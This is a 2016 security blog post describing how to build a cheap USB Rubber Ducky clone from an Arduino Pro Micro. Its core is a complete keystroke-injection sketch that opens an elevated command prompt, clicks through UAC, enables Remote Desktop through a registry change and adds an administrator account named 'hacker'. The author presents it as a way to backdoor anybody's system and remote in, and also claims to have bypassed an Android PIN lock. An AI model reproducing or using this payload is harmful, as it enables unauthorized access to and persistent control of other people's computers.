<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author"
    content="Nipun Jaswal">
<meta name="description"
    content="Holla Guys, It&amp;rsquo;s been a while I have been on my very own domain :P Anyways, today I would like to show you guys few things I have done in the past few years. I have been playing around with a lot of Arduino chips and ended up creating a clone of the USB Rubber Ducky using the keyboard libraries.  By using cheap Arduino chips I was not only able to run commands on my computer system but was able to bypass Android 4-Digit lock in less than 2 hours." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="/posts/2016/09/recreating-a-usb-rubber-ducky-under-4-in-india/" />


<title>
    
    Recreating a USB Rubber Ducky under $4 in India :: VAPT.IO - Home of the Next Gen Cyber Ninja  — Learn Vulnerability Assessment and Penetration Testing
    
</title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.min.7bfbbe12786fa0ded4b4c0d792cbb36a5bd0bdb0b856dde57aa7b1f6fe0f2b87.css">



<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
<link rel="shortcut icon" href="/favicon.ico">
<meta name="theme-color" content="#252627"><meta itemprop="name" content="Recreating a USB Rubber Ducky under $4 in India">
<meta itemprop="description" content="Holla Guys, It&rsquo;s been a while I have been on my very own domain :P Anyways, today I would like to show you guys few things I have done in the past few years. I have been playing around with a lot of Arduino chips and ended up creating a clone of the USB Rubber Ducky using the keyboard libraries.  By using cheap Arduino chips I was not only able to run commands on my computer system but was able to bypass Android 4-Digit lock in less than 2 hours.">


<meta itemprop="datePublished" content="2016-09-24T00:30:00&#43;05:30" />
<meta itemprop="dateModified" content="2016-09-24T00:30:00&#43;05:30" />
<meta itemprop="wordCount" content="567">



<meta itemprop="keywords" content="Arduino pro micro hack,evading windows 7 firewall,usb rubber ducky in india,duckuino attacks," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/"/>

<meta name="twitter:title" content="Recreating a USB Rubber Ducky under $4 in India"/>
<meta name="twitter:description" content="Holla Guys, It&rsquo;s been a while I have been on my very own domain :P Anyways, today I would like to show you guys few things I have done in the past few years. I have been playing around with a lot of Arduino chips and ended up creating a clone of the USB Rubber Ducky using the keyboard libraries.  By using cheap Arduino chips I was not only able to run commands on my computer system but was able to bypass Android 4-Digit lock in less than 2 hours."/>




<meta property="article:published_time" content="2016-09-24 00:30:00 &#43;0530 IST" />







    </head>

    <body class="">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">ap3x@vapt.io:~#</span>
            <span class="logo__cursor"></span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>3 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title"><a href="/posts/2016/09/recreating-a-usb-rubber-ducky-under-4-in-india/">Recreating a USB Rubber Ducky under $4 in India</a></h1>

            

            <div class="post-content">
                <p>Holla Guys,
It&rsquo;s been a while I have been on my very own domain :P Anyways, today I
would like to show you guys few things I have done in the past few
years. I have been playing around with a lot of Arduino chips and ended
up creating a clone of the USB Rubber Ducky using the keyboard
libraries.
<p align="center">
<a href="/images/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-arduino_logo_black-wallpaper-1280x720.jpg"><img src="/images/thumbnails/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-arduino_logo_black-wallpaper-1280x720.jpg" /></a>
</p></p>

<p>By using cheap Arduino chips I was not only able to run commands on my
computer system but was able to bypass Android 4-Digit lock in less than
2 hours.
<p align="center">
<a href="/images/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-Capture_115.PNG"><img src="/images/thumbnails/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-Capture_115.PNG" alt="" /></a>
</p>
So how was i able to do it? The very first thing we require is
an Arduino Pro Micro Chip. You will find it on Amazon, Ebay or anywhere
else and it would cost around 800-900 Rupees which is a lot of money :P
So, I chose to go with Aliexpress and got the chips for less than $4.
Having the chip, all you need to is to use a USB - Micro Cable to
connect your new Arduino chip to the system. For all the folks who know
about Arduino&rsquo;s please feel free to skip one or two paragraphs. You will
need the <a href="https://www.arduino.cc/en/Main/Software" target="_blank">Arduino IDE</a>
(Download and install). You will also need to set your board to Arduino
Leonardo(Compatible with Arduino Pro Micro)</p>

<p>Next, all we need to do is to interpret our required functionality in
the form of keystrokes and build a program around it.
<code>Keyboard.press()</code> function will type the required key for us while
<code>Keyboard.release()</code> will release a particular key. Another important
function is <code>Keyboard.releaseAll()</code> which will release all the pressed
keys at once. Say, <code>CTRL+SHIFT+DEL</code> pressing this combination will
require you to press one key after the other while holding them all and
releasing them together. Similar combinations are required for any
combinations we want. The beauty of the Arduino is that it types in so
fast that barely a human eye could catch(if very little delays are
present).  Let&rsquo;s say we need to open an admin prompt; we will first
press the left windows key, then we will type in cmd, then right
clicking <code>cmd</code>(<code>CTRL+SHIFT+F10</code>), then a down arrow key and finally enter
key. However, if UAC is enabled another Right Arrow Press Followed by an
Enter is required. You can understand the functionality through the
following image:
<p align="center">
<a href="./images/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-gg.gif"><img src="./images/2016-09-24-recreating-a-usb-rubber-ducky-under-4-in-india-gg.gif" alt="" /></a>
</p>
So, let&rsquo;s simply create an example program which will Bypass UAC, Enable
RDP and add a user named hacker to the system as follows:</p>

<pre><code> void setup() {
 Keyboard.begin();
 delay(3000);   
 type(KEY_LEFT_GUI,false);
 Keyboard.releaseAll();
 delay(100);
 print(F(&quot;cmd.exe&quot;));
 delay(1000);
 type(KEY_LEFT_CTRL,false);
 type(KEY_LEFT_SHIFT,false);
 type(KEY_F10,false);
 Keyboard.releaseAll();
 delay(200);
 type(KEY_DOWN_ARROW,false);
 Keyboard.releaseAll();
 delay(200);
 type(KEY_DOWN_ARROW,false);
 Keyboard.releaseAll();
 delay(200);
 type(KEY_DOWN_ARROW,false);
 Keyboard.releaseAll();
 delay(500); 
 type(KEY_RETURN,false);
 Keyboard.releaseAll();
 delay(2000);
 type(KEY_LEFT_ARROW,false);
 Keyboard.releaseAll();
 delay(100);
 type(KEY_RETURN,false);
 Keyboard.releaseAll();
 delay(1000);
 print(F(&quot;reg add &quot;));
 delay(1000);
 String abc= &quot;\\&quot;;
 print(F(&quot;\&quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\&quot;&quot;));
 delay(1000);
 print(F(&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&quot;));
 delay(2000);
 type(KEY\_RETURN,false);
 Keyboard.releaseAll();
 print(F(&quot;net user hacker hacker /add&quot;));
 delay(1000);
 type(KEY_RETURN,false);
 Keyboard.releaseAll();
 delay(5000);
 print(F(&quot;net localgroup administrators hacker /add&quot;));
 delay(1000);
 type(KEY_RETURN,false);
 Keyboard.releaseAll();
 delay(5000);
 print(F(&quot;exit&quot;));
 delay(1000);
 type(KEY_RETURN,false);
 Keyboard.releaseAll();
 Keyboard.end();
 }
 void type(int key, boolean release) {
     Keyboard.press(key);
     if(release)
         Keyboard.release(key);
 }
 void print(const __FlashStringHelper *value) {
     Keyboard.print(value);
 }
 void loop(){}
</code></pre>

<p>Loading this program into the Arduino, we can backdoor anybody&rsquo;s system
with a new user account and can remote connect to the system. However,
using a little modification you can also obtain the IP address of the
system as well.</p>

<p>I have already created a demonstration exploiting the
<code>CTRL+SHIFT+PRNTSCR</code> functionality at login time which can be found
below:
<p align="center">
<a href="http://www.youtube.com/watch?feature=player_embedded&v=owRznVsJonY
" target="_blank"><img src="http://img.youtube.com/vi/owRznVsJonY/0.jpg"
alt="phreaking" border="2" /></a></p></p>

<p>Enjoy!! Hope You will like this!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
                <p>
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/arduino-pro-micro-hack">Arduino pro micro hack</a></span><span class="tag"><a href="/tags/evading-windows-7-firewall">evading windows 7 firewall</a></span><span class="tag"><a href="/tags/usb-rubber-ducky-in-india">usb rubber ducky in india</a></span><span class="tag"><a href="/tags/duckuino-attacks">duckuino attacks</a></span>
                </p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>567 Words</p>

            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2016-09-24 00:30 &#43;0530</p>
        </div>

        
            <div class="pagination">
                <div class="pagination__title">
                    <span class="pagination__title-h"></span>
                    <hr />
                </div>

                <div class="pagination__buttons">
                    
                        <span class="button previous">
                            <a href="/posts/2017/08/antivirus-evasion-for-dummies/">
                                <span class="button__icon">←</span>
                                <span class="button__text">Antivirus Evasion for dummies</span>
                            </a>
                        </span>
                    

                    
                        <span class="button next">
                            <a href="/posts/2014/12/keep-spying-with-a-low-cost-voice-recorder/">
                                <span class="button__text">Keep Spying with a Low Cost Voice Recorder</span>
                                <span class="button__icon">→</span>
                            </a>
                        </span>
                    
                </div>
            </div>
        

        
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2020</span>
            
                <span><a href="/">Apex Predator</a></span>
            
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">

        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
        </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.4c3fb12a087ceed4a52cb5d57068a9795c7069617a01ca70f788052ad66e1791779e6c72686e1dc0ca13dc03b0203204b6566bb0dd1ee80de2b7ff4d8fe53db2.js" integrity="sha512-TD&#43;xKgh87tSlLLXVcGipeVxwaWF6Acpw94gFKtZuF5F3nmxyaG4dwMoT3AOwIDIEtlZrsN0e6A3it/9Nj&#43;U9sg=="></script>



    </body>
</html>
